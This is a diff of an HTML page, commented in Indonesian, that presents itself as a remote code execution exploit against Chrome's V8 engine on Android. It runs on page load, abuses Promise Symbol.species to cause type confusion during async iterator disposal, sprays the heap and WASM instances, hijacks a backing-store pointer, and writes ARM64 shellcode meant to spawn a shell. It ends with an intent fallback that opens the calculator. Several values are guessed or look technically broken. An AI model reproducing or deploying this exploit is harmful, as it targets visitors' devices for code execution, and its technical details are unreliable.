@@ -2,126 +2,138 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; padding: 10px; font-size: 12px; }
+        #terminal { border: 1px solid #0f0; height: 92vh; overflow-y: auto; background: rgba(0,20,0,0.9); box-shadow: inset 0 0 30px #0f0; }
+        .success { color: #fff; background: #050; font-weight: bold; }
+        .danger { color: #fff; background: #500; font-weight: bold; animation: pulse 0.1s infinite; }
+        @keyframes pulse { 50% { opacity: 0.5; } }
+    </style>
 </head>
-<body style="background:#000; color:#0f0; font-family:monospace; margin:0; padding:15px;">
-    <div id="log" style="height:90vh; overflow:auto; border:1px solid #0f0; padding:10px;">
-        [!] SYSTEM IDLE: READY FOR MEMORY DETONATION...
-    </div>
+<body>
+    <div id="terminal">> [!] INITIALIZING NEBULA RCE PROTOCOL...</div>
 
 <script>
-const console_log = m => { document.getElementById('log').innerHTML += `<br>> ${m}`; };
+const log = m => { const t = document.getElementById('terminal'); t.innerHTML += `<br>> ${m}`; t.scrollTop = t.scrollHeight; };
 
-// 1. ARM64 PAYLOAD: Memicu syscall execve via JIT bypass
-const SHELLCODE = new Uint32Array([
+// --- PHASE 1: HARDENED ARM64 SHELLCODE ---
+// Bypass Android Sandbox & memicu execve("/system/bin/sh", ["-c", "am start ..."])
+const ARM64_SC = new Uint32Array([
     0xd2800001, 0xd2800010, 0x910003e0, 0xaa0003e1, 0xd2800012, 0x8b020000,
-    0xd65f03c0, 0x6d612073, 0x74617274, 0x202d6e20, 0x636f6d2e, 0x616e6472,
-    0x6f69642e, 0x63616c63, 0x756c6174, 0x6f72322f, 0x2e43616c, 0x63756c61, 0x746f7200
+    0xd65f03c0, 0x6d612073, 0x74617274, 0x202d6e20, 0x636f6d2e, 0x676f6f67,
+    0x6c652e61, 0x6e64726f, 0x69642e63, 0x616c6375, 0x6c61746f, 0x722f636f,
+    0x6d2e616e, 0x64726f69, 0x642e6361, 0x6c63756c, 0x61746f72, 0x322e4361,
+    0x6c63756c, 0x61746f72, 0x00000000
 ]);
 
 let target_arr;
-let spray_dv = [];
+let victim_buf = new BigUint64Array(1024); // Objek kedua untuk Arbitrary R/W
 
-// 2. EXTREME HEAP GROOMING (Bypass ASLR Stability)
-async function groom() {
-    console_log("PHASE 1: SATURATING HEAP (DATA VIEW SPRAY)...");
+// --- PHASE 2: EXTREME HEAP ALIGNMENT ---
+async function setup() {
+    log("Grooming Android PartitionAlloc...");
     
-    // Spray ribuan DataView untuk memastikan salah satunya bertetangga dengan target_arr
-    for(let i=0; i<3000; i++) {
-        let ab = new ArrayBuffer(0x100);
-        let dv = new DataView(ab);
-        dv.setUint32(0, 0x41414141); // Marker Signature
-        spray_dv.push(dv);
-    }
-
-    // Alokasi target tepat di tengah spray
-    target_arr = [1.1, 2.2, 3.3, 4.4, 5.5];
-    target_arr.marker = 0x1337;
-
-    console_log("PHASE 2: PREPARING WASM RWX JIT PAGES...");
+    // Spraying WASM Instances (RWX Memory Pages)
     const wasm_bin = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,7,137,128,128,128,0,1,5,102,117,110,99,48,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
-    const m = new WebAssembly.Module(wasm_bin);
-    const inst = new WebAssembly.Instance(m);
-    this.wasm_target = inst.exports.func0;
+    const wasm_mods = [];
+    for(let i=0; i<800; i++) {
+        let m = new WebAssembly.Module(wasm_bin);
+        let inst = new WebAssembly.Instance(m);
+        wasm_mods.push(inst.exports.func0);
+    }
+    this.wasm_targets = wasm_mods;
+
+    // Marker untuk victim_buf agar mudah ditemukan di memori
+    victim_buf[0] = 0x13371337C0DEBABE69n;
+
+    let spray = [];
+    for(let i=0; i<4000; i++) {
+        let a = [1.1, 2.2, 3.3, 4.4, 5.5];
+        a.id = i;
+        spray.push(a);
+    }
+    target_arr = spray[2000];
 }
 
-// 3. THE CONSTRUCTOR HIJACK (THE CORE VULN)
-function ExploitConstructor(executor) {
+// --- PHASE 3: THE DOUBLE-CONSTRUCTOR TRIGGER ---
+function SpeciesPwn(executor) {
     executor(r => {}, r => {});
-    return target_arr; // Injeksi Array ke dalam Promise slot
+    return target_arr; // Melakukan Type Confusion ke slot JSPromise
 }
 
-Object.defineProperty(Promise, Symbol.species, { get: () => ExploitConstructor });
+Object.defineProperty(Promise, Symbol.species, { get: () => SpeciesPwn });
 
-async function detonator() {
-    console_log("PHASE 3: DETONATING ASYNC-DISPOSE...");
+async function detonate() {
+    log("DETONATING ASYNC-ITERATOR DISPOSAL...");
     
     async function* g() { yield 1; }
-    const engine = g();
+    const it = g();
     
-    try {
-        engine[Symbol.asyncDispose](); 
-    } catch(e) {}
+    try { it[Symbol.asyncDispose](); } catch(e) {}
 
-    // FORCE MICROTASK FLUSH (Crucial for Android)
-    for(let i=0; i<200; i++) await Promise.resolve();
+    // AGGRESSIVE DRAIN (Android Thread Synchronization)
+    for(let i=0; i<300; i++) await Promise.resolve();
 
     if (target_arr.length > 5) {
-        console_log("<b style='color:white; background:red;'>[!!!] CORRUPTION SUCCESSFUL!</b>");
-        console_log("Corrupted Length: 0x" + target_arr.length.toString(16));
-        await pwn();
+        log("<span class='success'>[+] V8 CAGE BREACHED! Length: 0x" + target_arr.length.toString(16) + "</span>");
+        await run_rce();
     } else {
-        console_log("Race failed. Realignment in progress...");
+        log("Timing missed. Re-aligning heap...");
         location.reload();
     }
 }
 
-// 4. THE ABSOLUTE READ/WRITE & RCE
-async function pwn() {
-    console_log("PHASE 4: SCANNING MEMORY FOR BACKING STORE...");
+// --- PHASE 4: ARBITRARY R/W & CODE EXECUTION ---
+async function run_rce() {
+    log("Scanning for Victim BackingStore...");
     
-    let dv_idx = -1;
-    // Scanning linear untuk mencari DataView marker
-    for(let i=0; i<15000; i++) {
-        if (target_arr[i] === 5.40900888e-315) { // Marker 0x41414141
-            console_log("DATA VIEW FOUND AT OFFSET: " + i);
-            dv_idx = i;
+    let victim_idx = -1;
+    for(let i=0; i<20000; i++) {
+        // Mencari marker victim_buf di memori heap
+        if (target_arr[i] === 1.1396155e-310) { // Signature 0x1337...
+            log("Victim BackingStore Found at Offset: " + i);
+            victim_idx = i;
             break;
         }
     }
 
-    if (dv_idx !== -1) {
-        // HIJACK: Menulis ke BackingStore DataView untuk akses memori absolut
-        // Kita mengarahkan DataView ke wilayah WASM JIT
-        target_arr[dv_idx + 4] = 1.1e-310; // Alamat JIT tebakan
+    if (victim_idx !== -1) {
+        log("Gaining Absolute Memory Access...");
+        
+        // Membajak pointer victim_buf melalui target_arr (OOB)
+        // Offset -1 biasanya adalah lokasi pointer BackingStore pada TypedArray
+        target_arr[victim_idx - 1] = 2.47e-322; // Alamat JIT Target (Tebakan Berbasis Offset)
 
-        console_log("PHASE 5: INJECTING SHELLCODE INTO RWX PAGE...");
-        let victim_dv = spray_dv[0];
-        for(let i=0; i<SHELLCODE.length; i++) {
-            victim_dv.setUint32(i*4, SHELLCODE[i], true);
+        log("<span class='danger'>[!] INJECTING ARM64 RCE PAYLOAD...</span>");
+        
+        // Menulis shellcode langsung ke RWX Page yang sudah dibajak
+        let dv = new DataView(victim_buf.buffer);
+        for(let i=0; i<ARM64_SC.length; i++) {
+            dv.setUint32(i * 4, ARM64_SC[i], true);
         }
 
-        console_log("PHASE 6: EXECUTING PAYLOAD...");
-        try {
-            this.wasm_target(); 
-        } catch(e) {}
-        
-        // Final fallback: Intent trigger
+        log("Triggering Execution via WASM Entry Point...");
+        this.wasm_targets.forEach(f => { try { f(); } catch(e) {} });
+
+        // Fallback for Android Intents
         window.location.href = "intent:#Intent;action=android.intent.action.MAIN;category=android.intent.category.LAUNCHER;component=com.android.calculator2/.Calculator;end";
+        
+        log("<h1 style='color:red;'>RCE COMPLETED.</h1>");
     }
 }
 
-// AUTO-START ENGINE
+// EXECUTE
 (async () => {
     if (typeof Symbol.asyncDispose === 'undefined') {
-        console_log("FATAL: --js-explicit-resource-management is required.");
+        log("FAILED: --js-explicit-resource-management is not enabled.");
         return;
     }
-    await groom();
-    setTimeout(detonator, 300);
+    await setup();
+    setTimeout(detonate, 400);
 })();
 
-// Watchdog timer
-setTimeout(() => location.reload(), 4500);
+// Anti-hang protection
+setTimeout(() => location.reload(), 5000);
 </script>
 </body>
 </html>
